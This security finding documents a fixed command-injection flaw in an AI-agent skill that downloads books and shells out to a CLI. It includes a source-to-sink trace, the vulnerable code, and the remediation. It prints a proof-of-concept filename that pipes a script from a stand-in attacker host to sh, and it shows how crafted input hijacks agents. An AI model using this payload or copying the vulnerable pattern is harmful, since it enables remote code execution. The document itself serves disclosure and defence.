# Finding — OS Command Injection in an AI-Agent Skill (`zlibrary-to-notebooklm`)

> Community-contributed real-world finding, in SEC-AF's verdict → trace → evidence style. It demonstrates the OS command-injection class SEC-AF detects in **AI-agent skills** — automation that an agent runs on attacker-influenced input. The vulnerable project is an MIT-licensed agent "skill" that downloads a book and shells out to the NotebookLM CLI. **Already remediated** (fix below); provided as an example/fixture, not a live 0-day.

| | |
|---|---|
| **Title** | OS Command Injection via attacker-controlled book filename in `scripts/upload.py` |
| **Severity** | Critical (SEC-AF CWE-78 RCE floor) |
| **Verdict** | `confirmed` — full source → sink data flow, no sanitisation |
| **Evidence level** | 5 / 6 |
| **Exploitability** | 9.0 / 10 (critical × evidence-5 × externally-reachable) |
| **CWE** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) (OS Command Injection) |
| **OWASP** | A03:2021 — Injection |
| **Sinks** | 7 × `subprocess.run(..., shell=True)` (1 in `convert_to_txt`, 6 in `upload_to_notebooklm`) |
| **Status** | **Fixed** — refactored to list-argv, `shell=False` |

## Why this matters for AI agents

This is the failure mode that makes agent skills dangerous: the skill **auto-downloads** a file from an untrusted source (Z-Library) and then **shells out** using values derived from that file's name. The agent never "decided" to run a shell command — a crafted filename did. Patterns flag `shell=True`; SEC-AF proves the *reachable data flow* from the remote filename to the shell sink.

## Data-flow trace (source → sink)

**Source:** `download.suggested_filename` — the book's filename, set by whoever uploaded it to Z-Library (attacker-controllable).

```
scripts/upload.py:130  suggested_filename = download.suggested_filename          # taint in
scripts/upload.py:132  download_path = self.downloads_dir / suggested_filename   # path tainted
scripts/upload.py:296  return download_path, downloaded_format                   # -> main() -> convert/upload
scripts/upload.py:525  title = file_path.stem.replace('_', ' ')                  # title tainted
scripts/upload.py:432  cmd = f"python3 '{convert_script}' '{file_path}' '{md_file}'"   # interpolated
scripts/upload.py:554  cmd = f"nlm source add '{file_path}' --json"              # interpolated
scripts/upload.py:555  subprocess.run(cmd, shell=True, ...)                      # SINK
```

**Sink:** `subprocess.run(cmd, shell=True)` — the string goes to `/bin/sh -c`, so shell metacharacters in the filename are interpreted, not escaped. The wrapping single-quotes are not a defence: a `'` in the filename closes them.

## Proof of exploitability

A book uploaded to Z-Library named:

```
'; curl https://evil.example/x.sh | sh; '.epub
```

When the victim runs the skill on it, the `'` breaks out of the quoting, `;` ends the intended command, and `curl … | sh` executes with the user's privileges → **remote code execution** on the machine running the agent. No further interaction required beyond processing the download.

## Remediation (applied)

Pass arguments as a list with `shell=False` (the subprocess default) so the tainted value is data, never a shell token:

```python
# before (vulnerable)
cmd = f"nlm source add '{file_path}' --json"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

# after (safe)
result = subprocess.run(["nlm", "source", "add", str(file_path), "--json"],
                        capture_output=True, text=True)
```

All seven invocations were refactored this way. Binary name (`nlm`), JSON parsing, return shapes, retry/error handling, and the sequential one-chunk-at-a-time upload behaviour were preserved. Verified: `python -m py_compile` passes and zero `shell=True` remain.

## Compliance mapping

| Framework | Control |
|---|---|
| OWASP | A03:2021 — Injection |
| CWE | CWE-78 — OS Command Injection |
| PCI-DSS | Req 6.2.4 — common coding vulnerabilities |
| SOC2 | CC6 — access controls |
| ISO 27001 | A.8.28 — secure coding |

## References

- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Python `subprocess` security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)

*Structured finding (SEC-AF schema): [`zlibrary-to-notebooklm-command-injection.finding.json`](./zlibrary-to-notebooklm-command-injection.finding.json).*
